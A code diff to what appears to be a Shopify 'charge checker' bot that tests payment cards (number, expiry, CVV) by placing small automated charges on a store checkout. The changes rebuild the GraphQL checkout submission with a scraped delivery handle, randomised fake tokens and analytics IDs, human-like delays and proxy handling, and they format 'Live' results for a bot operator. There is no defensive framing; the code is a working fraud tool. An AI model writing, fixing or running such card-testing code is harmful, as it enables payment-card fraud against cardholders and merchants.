@@ -339,7 +339,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 <b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
 <b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
 ━━━━━━━━━━━━━━━
-<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
+<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]]
 """
     return result
 
@@ -368,6 +368,7 @@ class ShopifyChargeChecker:
         self.product_id = None
         self.product_price = None  # Store actual product price
         self.shop_id = None
+        self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
         
         # CORRECTED addresses from your instructions - FOR PICKUP
         self.shipping_address = {
@@ -613,6 +614,13 @@ class ShopifyChargeChecker:
                 if not self.product_price:
                     self.product_price = 0.55  # Default fallback
                     self.console_logger.sub_step(2, 6, f"Using default price: ${self.product_price:.2f}")
+                
+                # Extract delivery strategy handle
+                handle_pattern = r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"'
+                handle_match = re.search(handle_pattern, html_content)
+                if handle_match:
+                    self.delivery_strategy_handle = handle_match.group(1)
+                    self.console_logger.extracted_data("Delivery Strategy Handle", self.delivery_strategy_handle)
                 
                 self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
                 return True
@@ -1178,9 +1186,9 @@ class ShopifyChargeChecker:
             return False, f"Payment error: {str(e)[:80]}"
     
     async def complete_checkout_with_payment(self, client, session_id, cc, mes, ano, cvv):
-        """Complete the checkout with SIMPLIFIED STRUCTURE - FIXED FOR PICKUP"""
+        """Complete the checkout with CORRECT STRUCTURE - FIXED DELIVERY"""
         try:
-            elapsed = self.console_logger.step(8, "COMPLETE CHECKOUT", "Submitting checkout with SIMPLIFIED structure")
+            elapsed = self.console_logger.step(8, "COMPLETE CHECKOUT", "Submitting checkout with CORRECT structure")
             
             if not self.checkout_token or not self.x_checkout_one_session_token:
                 return False, "Missing checkout tokens"
@@ -1224,7 +1232,10 @@ class ShopifyChargeChecker:
             actual_price = self.product_price if self.product_price else 0.55
             price_str = f"{actual_price:.2f}"
             
-            # SIMPLIFIED payload - REMOVED COMPLEX DELIVERY STRUCTURE
+            # Generate stable ID for merchandise lines
+            stable_id = f"stable-{random.randint(1000, 9999)}"
+            
+            # CORRECTED payload - RESTORED FULL DELIVERY STRUCTURE FROM OLD SCRIPT
             json_data = {
                 "operationName": "SubmitForCompletion",
                 "variables": {
@@ -1232,82 +1243,197 @@ class ShopifyChargeChecker:
                         "sessionInput": {
                             "sessionToken": self.x_checkout_one_session_token,
                         },
+                        "queueToken": f"{self.generate_random_string(43)}==",
                         "discounts": {
                             "lines": [],
                             "acceptUnexpectedDiscounts": True,
                         },
-                        # SIMPLIFIED DELIVERY - NO delivery.noDeliveryRequired object
+                        # CORRECTED DELIVERY STRUCTURE - FULL OBJECT WITH PICKUP
                         "delivery": {
-                            "deliveryLines": [],  # Empty array for pickup
-                            "noDeliveryRequired": True  # Simple boolean, not object
+                            "deliveryLines": [{
+                                "destination": {
+                                    "geolocation": {
+                                        "coordinates": {
+                                            "latitude": 40.18073830000001,
+                                            "longitude": -75.14480139999999
+                                        },
+                                        "countryCode": "US"
+                                    }
+                                },
+                                "selectedDeliveryStrategy": {
+                                    "deliveryStrategyByHandle": {
+                                        "handle": self.delivery_strategy_handle,
+                                        "customDeliveryRate": False
+                                    },
+                                    "options": {}
+                                },
+                                "targetMerchandiseLines": {
+                                    "lines": [{
+                                        "stableId": stable_id
+                                    }]
+                                },
+                                "deliveryMethodTypes": ["PICK_UP"],
+                                "expectedTotalPrice": {
+                                    "value": {
+                                        "amount": "0.00",
+                                        "currencyCode": "USD"
+                                    }
+                                },
+                                "destinationChanged": True
+                            }],
+                            "noDeliveryRequired": [],  # EMPTY ARRAY - NOT BOOLEAN!
+                            "useProgressiveRates": False,
+                            "prefetchShippingRatesStrategy": None,
+                            "supportsSplitShipping": True
+                        },
+                        "deliveryExpectations": {
+                            "deliveryExpectationLines": []
                         },
                         "merchandise": {
-                            "merchandiseLines": [
-                                {
-                                    "stableId": "default",
-                                    "merchandise": {
-                                        "productVariantReference": {
-                                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
-                                            "properties": []  # Empty properties array
-                                        },
-                                    },
-                                    "quantity": {"items": {"value": 1}},
-                                    # REQUIRED: expectedTotalPrice
-                                    "expectedTotalPrice": {
-                                        "value": {
-                                            "amount": price_str,
-                                            "currencyCode": "USD",
-                                        },
-                                    },
+                            "merchandiseLines": [{
+                                "stableId": stable_id,
+                                "merchandise": {
+                                    "productVariantReference": {
+                                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
+                                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
+                                        "properties": [],
+                                        "sellingPlanId": None,
+                                        "sellingPlanDigest": None
+                                    }
                                 },
-                            ],
+                                "quantity": {
+                                    "items": {
+                                        "value": 1
+                                    }
+                                },
+                                "expectedTotalPrice": {
+                                    "value": {
+                                        "amount": price_str,
+                                        "currencyCode": "USD"
+                                    }
+                                },
+                                "lineComponentsSource": None,
+                                "lineComponents": []
+                            }]
+                        },
+                        "memberships": {
+                            "memberships": []
                         },
                         "payment": {
-                            "paymentLines": [
-                                {
-                                    "paymentMethod": {
-                                        "directPaymentMethod": {
-                                            "paymentMethodIdentifier": "shopify_payments",
-                                            "sessionId": session_id,
-                                            "billingAddress": {
-                                                "streetAddress": {
-                                                    "address1": self.billing_address["address1"],
-                                                    "city": self.billing_address["city"],
-                                                    "countryCode": self.billing_address["country"],
-                                                    "postalCode": self.billing_address["zip"],
-                                                    "firstName": self.billing_address["first_name"],
-                                                    "lastName": self.billing_address["last_name"],
-                                                    "zoneCode": self.billing_address["province"],
-                                                    "phone": self.billing_address["phone"],
-                                                },
-                                            },
+                            "totalAmount": {"any": True},
+                            "paymentLines": [{
+                                "paymentMethod": {
+                                    "directPaymentMethod": {
+                                        "paymentMethodIdentifier": "shopify_payments",
+                                        "sessionId": session_id,
+                                        "billingAddress": {
+                                            "streetAddress": {
+                                                "address1": self.billing_address["address1"],
+                                                "address2": self.billing_address["address2"],
+                                                "city": self.billing_address["city"],
+                                                "countryCode": self.billing_address["country"],
+                                                "postalCode": self.billing_address["zip"],
+                                                "firstName": self.billing_address["first_name"],
+                                                "lastName": self.billing_address["last_name"],
+                                                "zoneCode": self.billing_address["province"],
+                                                "phone": self.billing_address["phone"]
+                                            }
                                         },
+                                        "cardSource": None
                                     },
-                                    "amount": {
-                                        "value": {
-                                            "amount": price_str,
-                                            "currencyCode": "USD",
-                                        },
-                                    },
+                                    "giftCardPaymentMethod": None,
+                                    "redeemablePaymentMethod": None,
+                                    "walletPaymentMethod": None,
+                                    "walletsPlatformPaymentMethod": None,
+                                    "localPaymentMethod": None,
+                                    "paymentOnDeliveryMethod": None,
+                                    "paymentOnDeliveryMethod2": None,
+                                    "manualPaymentMethod": None,
+                                    "customPaymentMethod": None,
+                                    "offsitePaymentMethod": None,
+                                    "customOnsitePaymentMethod": None,
+                                    "deferredPaymentMethod": None,
+                                    "customerCreditCardPaymentMethod": None,
+                                    "paypalBillingAgreementPaymentMethod": None,
+                                    "remotePaymentInstrument": None
                                 },
-                            ],
-                            # REQUIRED: totalAmount
-                            "totalAmount": {
-                                "value": {
-                                    "amount": price_str,
-                                    "currencyCode": "USD",
-                                },
-                            },
+                                "amount": {
+                                    "value": {
+                                        "amount": price_str,
+                                        "currencyCode": "USD"
+                                    }
+                                }
+                            }],
+                            "billingAddress": {
+                                "streetAddress": {
+                                    "address1": self.billing_address["address1"],
+                                    "address2": self.billing_address["address2"],
+                                    "city": self.billing_address["city"],
+                                    "countryCode": self.billing_address["country"],
+                                    "postalCode": self.billing_address["zip"],
+                                    "firstName": self.billing_address["first_name"],
+                                    "lastName": self.billing_address["last_name"],
+                                    "zoneCode": self.billing_address["province"],
+                                    "phone": self.billing_address["phone"]
+                                }
+                            }
                         },
                         "buyerIdentity": {
+                            "customer": {
+                                "presentmentCurrency": "USD",
+                                "countryCode": "US"
+                            },
                             "email": self.shipping_address["email"],
+                            "emailChanged": False,
                             "phoneCountryCode": "US",
+                            "marketingConsent": [],
+                            "shopPayOptInPhone": {
+                                "countryCode": "US"
+                            },
+                            "rememberMe": False
                         },
+                        "tip": {
+                            "tipLines": []
+                        },
+                        "taxes": {
+                            "proposedAllocations": None,
+                            "proposedTotalAmount": {
+                                "value": {
+                                    "amount": "0.03",
+                                    "currencyCode": "USD"
+                                }
+                            },
+                            "proposedTotalIncludedAmount": None,
+                            "proposedMixedStateTotalAmount": None,
+                            "proposedExemptions": []
+                        },
+                        "note": {
+                            "message": None,
+                            "customAttributes": []
+                        },
+                        "localizationExtension": {
+                            "fields": []
+                        },
+                        "nonNegotiableTerms": None,
+                        "scriptFingerprint": {
+                            "signature": None,
+                            "signatureUuid": None,
+                            "lineItemScriptChanges": [],
+                            "paymentScriptChanges": [],
+                            "shippingScriptChanges": []
+                        },
+                        "optionalDuties": {
+                            "buyerRefusesDuties": False
+                        },
+                        "cartMetafields": []
                     },
                     "attemptToken": f"{checkout_token_to_use}-{random.randint(1000, 9999)}",
                     "metafields": [],
+                    "analytics": {
+                        "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{checkout_token_to_use}/en-us?_r={self.generate_random_string(32)}",
+                        "pageId": f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}"
+                    }
                 },
-                # Use the correct persisted query ID from logs
                 "id": "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
             }
             
@@ -1320,7 +1446,7 @@ class ShopifyChargeChecker:
             self.console_logger.sub_step(8, 6, f"Billing name: {card_name}")
             self.console_logger.sub_step(8, 7, f"Using ACTUAL price: ${actual_price:.2f}")
             self.console_logger.sub_step(8, 8, f"Address: {self.billing_address['address1']}, {self.billing_address['city']}")
-            self.console_logger.sub_step(8, 9, f"Delivery: SIMPLIFIED (noDeliveryRequired: true)")
+            self.console_logger.sub_step(8, 9, f"Delivery: FULL STRUCTURE with PICK_UP")
             self.console_logger.sub_step(8, 10, f"Payload size: {len(json.dumps(json_data))} bytes")
             
             response = await client.post(
@@ -1338,7 +1464,7 @@ class ShopifyChargeChecker:
             
             self.console_logger.request_details("POST", url, response.status_code,
                                               time.time() - (self.console_logger.start_time + elapsed),
-                                              "Complete checkout with SIMPLIFIED structure")
+                                              "Complete checkout with CORRECT structure")
             
             # DEBUG: Log response details
             self.console_logger.sub_step(8, 11, f"Response status: {response.status_code}")
@@ -1615,6 +1741,10 @@ class ShopifyChargeChecker:
         signature = ''.join(random.choices(string.ascii_letters + string.digits, k=43))
         return f"{header}.{payload}.{signature}"
     
+    def generate_random_string(self, length=16):
+        """Generate random string"""
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    
     async def check_card(self, card_details, username, user_data):
         """Main card checking method - SINGLE SUBMISSION FLOW WITH PICKUP"""
         start_time = time.time()
@@ -1764,7 +1894,7 @@ class ShopifyChargeChecker:
                 session_id = session_result
                 await self.human_delay(1, 2)
                 
-                # Step 8: Complete checkout with SIMPLIFIED structure
+                # Step 8: Complete checkout with CORRECT structure
                 success, checkout_result = await self.complete_checkout_with_payment(client, session_id, cc, mes, ano, cvv)
                 if checkout_result == "PROXY_DEAD":
                     elapsed_time = time.time() - start_time
